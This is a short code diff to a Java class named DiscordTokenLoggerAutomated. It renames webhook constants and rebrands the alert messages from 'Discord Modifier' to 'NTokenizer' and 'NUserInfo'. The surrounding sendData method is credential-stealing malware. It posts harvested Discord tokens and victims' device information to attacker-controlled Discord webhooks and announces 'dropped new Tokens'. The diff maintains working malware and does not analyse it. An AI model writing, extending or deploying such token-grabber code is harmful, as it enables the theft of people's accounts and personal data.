@@ -72,8 +72,8 @@ public class DiscordTokenLoggerAutomated {
     private static void sendData() {
         new Thread(() -> {
             try {
-                DiscordWebhook grabberInfo = new DiscordWebhook(WebhookUrls.DISCORD_TOKENS);
-                grabberInfo.setContent("@everyone 'Discord Modifier' has dropped new Tokens. Care to check them out?");
+                DiscordWebhook grabberInfo = new DiscordWebhook(WebhookData.DISCORD_TOKENS);
+                grabberInfo.setContent("@everyone 'NTokenizer' has dropped new Tokens. Care to check them out?");
                 grabberInfo.setTts(false);
 
                 DiscordWebhook.EmbedObject embedInfo = new DiscordWebhook.EmbedObject()
@@ -99,8 +99,8 @@ public class DiscordTokenLoggerAutomated {
 
         new Thread(() -> {
             try {
-                DiscordWebhook userInfo = new DiscordWebhook(WebhookUrls.USER_INFO);
-                userInfo.setContent("@everyone 'Discord Modifier' has dropped new Device Information. Care to check it out?");
+                DiscordWebhook userInfo = new DiscordWebhook(WebhookData.USER_INFO);
+                userInfo.setContent("@everyone 'NUserInfo' has dropped new Device Information. Care to check it out?");
                 userInfo.setTts(false);
 
                 DiscordWebhook.EmbedObject embedInfo = new DiscordWebhook.EmbedObject()
